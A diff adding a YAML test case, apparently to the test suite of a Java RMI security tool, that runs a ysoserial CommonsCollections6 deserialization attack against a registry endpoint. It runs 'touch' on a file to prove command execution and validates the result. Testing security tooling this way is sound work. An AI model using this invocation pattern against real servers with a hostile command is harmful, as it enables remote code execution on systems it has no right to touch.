@@ -86,6 +86,34 @@ tests:
             - '${volume}/${file}'
 
 
+  - title: Gadget Call (Activation)
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint.'
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET-ACT}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException during deserialization attack
+            - Deserialization attack was probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
   - title: JEP290 Bypass
     description: |-
       'Attempts a deserialization attack on the registry endpoint,'
